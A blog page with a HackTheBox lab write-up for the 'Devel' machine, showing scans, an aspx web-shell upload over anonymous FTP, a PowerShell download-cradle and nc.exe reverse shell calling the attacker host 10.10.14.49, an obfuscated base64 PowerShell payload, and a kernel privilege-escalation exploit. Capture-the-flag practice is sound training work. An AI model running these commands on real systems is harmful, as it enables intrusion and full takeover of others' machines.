@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-03-13T22:37:39 EDT">
+<title>Devel :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/devel/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/nmap/" class="dd-item">
+    <div>
+        <a href="/tools/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/"  selected>-- Devel</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Devel</h1>
+    
+    
+    
+    <pre><code>nmap -sT -p- -Pn -T5 nmap/initial 10.10.10.5
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 14:57 EST
+Unable to split netmask from target expression: &quot;nmap/initial&quot;
+Nmap scan report for 10.10.10.5
+Host is up (0.044s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 75.84 seconds
+</code></pre>
+
+<pre><code>nmap -sV -sC -p21,80 nmap/http-ftp 10.10.10.5                                                   
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-23 15:01 EST
+Unable to split netmask from target expression: &quot;nmap/http-ftp&quot;
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                      
+Service scan Timing: About 50.00% done; ETC: 15:01 (0:00:06 remaining)                                                           
+Nmap scan report for 10.10.10.5
+Host is up (0.039s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+| 02-27-19  12:20AM                 2788 getfuckd.aspx
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+
+<p>filtered ports</p>
+
+<pre><code>
+</code></pre>
+
+<p>FTP</p>
+
+<p>ftp as anonymous</p>
+
+<pre><code>ftp 10.10.10.5
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/devel/C:UserscharlOneDrivePictureshacktheboxdevelftp.PNG" alt="ftp" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/devel/C:UserscharlOneDrivePictureshacktheboxdevelftp2.PNG" alt="ftp2" /></p>
+
+<p>as you can see i uploaded a asp &amp; an aspx. the former did not work out for me. the later opened a shell.</p>
+
+<p><img src="https://chickenpwny.github.io/images/devel/C:UserscharlOneDrivePictureshacktheboxdevelaspx-shell.PNG" alt="aspx-shell" /></p>
+
+<p>send it over to burp turn on intercept.</p>
+
+<p><img src="https://chickenpwny.github.io/images/devel/C:UserscharlOneDrivePictureshacktheboxdevelaspx-shell2.PNG" alt="aspx-shell2" /></p>
+
+<p>Setup up python http server &amp; NetCat listener. Then run powershell iex</p>
+
+<pre><code>python -m http.server 80
+</code></pre>
+
+<pre><code>nc -lvnp 443
+</code></pre>
+
+<p>IEX invoke</p>
+
+<p>be sure to url encode this string when using burp no need to encode when using the webpage.</p>
+
+<pre><code>IEX(New-Object Net.WebClient).downloadstring(http://10.10.14.49/Invoke-PowerShellTcp.ps1)
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/devel/../optimum/invoke.PNG" alt="invoke" /></p>
+
+<p>NC.EXE</p>
+
+<p>this one tricky i tried to be cool and run it form the nishang shell and cmd.aspx but i keep running into error. i&rsquo;ve run it with c:\windows\syswow64\cmd.exe. anywho the only way i got this to work was executing this from the smbshare. since the smb share isn&rsquo;t exposed to the outside. you could run this form inside nishang or the webportal.</p>
+
+<pre><code>nc -lvnp 1920
+</code></pre>
+
+<pre><code>locate smbserver.py
+mkdir smb &lt;=== put stuff here
+./smbserver.py share smb
+\\10.10.14.49\share\nc.exe -e cmd.exe 10.10.14.49 1920
+</code></pre>
+
+<p>SHELL</p>
+
+<pre><code>whoami			output 		iis apppool\web
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/devel/C:UserscharlOneDrivePictureshacktheboxdevelpowershell-shell.PNG" alt="powershell-shell" /></p>
+
+<p>No, idea what to do here going to start running various powershell scripts to see if i can elevate my privledges.</p>
+
+<pre><code>c:\windows\system32\powershell -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;
+
+
+</code></pre>
+
+<p>IIS WEB ROOT DIRECTORY</p>
+
+<pre><code>C:\inetpub\wwwroot
+</code></pre>
+
+<p>Enumeration</p>
+
+<p>Windows version</p>
+
+<pre><code>systeminfo
+</code></pre>
+
+<pre><code>systeminfo                             
+                                                    
+Host Name:                 DEVEL               
+OS Name:                   Microsoft Windows 7 Enterprise
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ??
+System Boot Time:          27/2/2019, 6:48:35 ??
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.024 MB
+Available Physical Memory: 641 MB
+Virtual Memory: Max Size:  2.048 MB
+Virtual Memory: Available: 1.267 MB
+Virtual Memory: In Use:    781 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+
+</code></pre>
+
+<p>Watson</p>
+
+<p>Read oxdf guide on setting up watson. Nishang shells suck. Running things inside of powershell kind of sucks. Execute this using the smbshare.</p>
+
+<pre><code>\\10.10.14.49\share\Watson.exe
+</code></pre>
+
+<pre><code>[*] OS Build number: 7600
+ [*] CPU Address Width: 32
+ [*] Process IntPtr Size: 4
+ [*] Using Windows path: C:\WINDOWS\System32
+
+  [*] Appears vulnerable to MS10-073
+   [&gt;] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.                 
+   [&gt;] Exploit: https://www.exploit-db.com/exploits/36327/
+   [&gt;] Notes: None.
+
+  [*] Appears vulnerable to MS10-092
+   [&gt;] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Als
+o, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision
+, an attacker can execute arbitrary commands with SYSTEM privileges.
+   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb                            
+   [&gt;] Notes: None.
+
+  [*] Appears vulnerable to MS11-046
+   [&gt;] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
+   [&gt;] Exploit: https://www.exploit-db.com/exploits/40564/
+   [&gt;] Notes: None.
+
+  [*] Appears vulnerable to MS12-042
+   [&gt;] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in
+kernel mode.
+   [&gt;] Exploit: https://www.exploit-db.com/exploits/20861/
+   [&gt;] Notes: None.
+
+  [*] Appears vulnerable to MS13-005
+   [&gt;] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity
+ Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
+   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
+   [&gt;] Notes: None.
+</code></pre>
+
+<p>MS11-046</p>
+
+<p>be sure to run this in a netcat.exe shell and not a nishang shell..</p>
+
+<pre><code>google windows-kernel-exploits
+locate MS11-046
+\\10.10.14.49\share\MS11-046.exe
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/devel/victory.PNG" alt="victory" /></p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper"> <i class="fa fa-chevron-left"></i><label>CrimeStopper</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/legacy/" title="Legacy" style="margin-right: 0px;"><label>Legacy</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/devel.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
